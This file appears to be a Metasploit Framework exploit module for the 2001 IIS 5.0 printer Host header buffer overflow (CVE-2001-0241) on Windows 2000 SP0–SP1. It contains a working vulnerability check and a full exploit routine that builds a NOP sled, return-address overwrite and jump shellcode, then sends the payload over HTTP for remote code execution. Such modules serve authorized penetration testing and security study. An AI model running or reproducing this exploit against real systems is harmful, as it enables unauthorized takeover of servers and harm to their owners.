##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft IIS 5.0 Printer Host Header Overflow',
			'Description'    => %q{
					This exploits a buffer overflow in the request processor of
				the Internet Printing Protocol ISAPI module in IIS. This
				module works against Windows 2000 service pack 0 and 1. If
				the service stops responding after a successful compromise,
				run the exploit a couple more times to completely kill the
				hung process.
			},
			'Author'         => [ 'hdm' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2001-0241'],
					[ 'OSVDB', '3323'],
					[ 'BID', '2674'],
					[ 'MSB', 'MS01-023'],
					[ 'URL', 'http://seclists.org/lists/bugtraq/2001/May/0005.html'],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 900,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' => -3500,
				},
			'Targets'        =>
				[
					[
						'Windows 2000 English SP0-SP1',
						{
							'Platform' => 'win',
							'Ret'      => 0x732c45f3,
						},
					],
				],
			'Platform'       => 'win',
			'DisclosureDate' => 'May 1 2001',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(80)
			], self.class)
	end


	def check
		connect
		sock.put("GET /NULL.printer HTTP/1.0\r\n\r\n")
		resp = sock.get_once
		disconnect

		if !(resp and resp =~ /Error in web printer/)
			return Exploit::CheckCode::Safe
		end

		connect
		sock.put("GET /NULL.printer HTTP/1.0\r\nHost: #{"X"*257}\r\n\r\n")
		resp = sock.get_once
		disconnect

		if (resp and resp =~ /locked out/)
			print_status("The IUSER account is locked out, we can't check")
			return Exploit::CheckCode::Detected
		end

		if (resp and resp.index("HTTP/1.1 500") >= 0)
			return Exploit::CheckCode::Vulnerable
		end

		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		buf = make_nops(280)
		buf[268, 4] = [target.ret].pack('V')

		# payload is at: [ebx + 96] + 256 + 64
		buf << "\x8b\x4b\x60"        # mov ecx, [ebx + 96]
		buf << "\x80\xc1\x40"        # add cl, 64
		buf << "\x80\xc5\x01"        # add ch, 1
		buf << "\xff\xe1"            # jmp ecx

		sock.put("GET http://#{buf}/NULL.printer?#{payload.encoded} HTTP/1.0\r\n\r\n")

		handler
		disconnect
	end

end
